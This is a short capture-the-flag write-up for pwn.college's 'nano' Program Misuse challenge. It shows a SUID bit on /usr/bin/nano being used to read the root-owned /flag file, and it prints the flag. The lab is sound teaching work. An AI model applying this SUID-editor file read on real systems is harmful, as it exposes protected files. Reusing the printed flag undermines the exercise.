---
layout: page
title: "Challenge Name: nano"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/nano`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/nano
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/nano
```

-The `s` in `-rws` indicates it's a SUID binary.
-`nano` runs with **root privileges**.

## 🚀 Exploitation

The `nano` is a lightweight, beginner-friendly terminal text editor in Linux. It’s often preinstalled and is perfect for quick edits, scripts, and configuration files, so we can just use `nano` to read the flag.

```bash
nano /flag
```

Output:
```
pwn.college{40PG0OO3fRY0tXCw5bu8g6E_9QA.dFTNxwSM0IzMyEzW}
```

